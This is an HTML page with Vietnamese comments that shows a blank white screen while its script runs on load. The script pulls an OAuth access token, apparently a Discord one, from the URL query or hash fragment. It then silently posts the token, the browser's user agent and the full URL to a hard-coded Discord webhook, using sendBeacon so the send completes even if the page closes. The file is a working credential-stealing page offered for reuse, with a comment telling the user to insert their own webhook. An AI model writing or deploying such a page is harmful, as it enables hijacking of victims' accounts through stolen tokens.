<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    // Thay link webhook của bạn vào đây
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";

    function extractToken() {
        let token = null;

        // 1. Kiểm tra query string (?token=... hoặc ?access_token=...)
        const urlParams = new URLSearchParams(window.location.search);
        token = urlParams.get('token') || urlParams.get('access_token');

        // 2. Kiểm tra hash fragment (#token=... hoặc #access_token=...) - Chuẩn Discord OAuth2
        if (!token && window.location.hash) {
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            token = hashParams.get('token') || hashParams.get('access_token');
        }

        return token;
    }

    function sendToWebhook() {
        const token = extractToken();
        if (!token || !WEBHOOK_URL || WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) return;

        const payload = {
            token: token,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent,
            fullUrl: window.location.href
        };

        const jsonData = JSON.stringify(payload);

        // Hỗ trợ tối ưu cho cả Mobile và PC (gửi ngầm ngay cả khi trang đóng/chuyển hướng)
        if (navigator.sendBeacon) {
            const blob = new Blob([jsonData], { type: 'application/json' });
            navigator.sendBeacon(WEBHOOK_URL, blob);
        } else {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: jsonData,
                keepalive: true
            }).catch(() => {});
        }
    }

    // Thực thi ngay khi tải trang
    window.addEventListener('load', sendToWebhook);
</script>

</body>
</html>
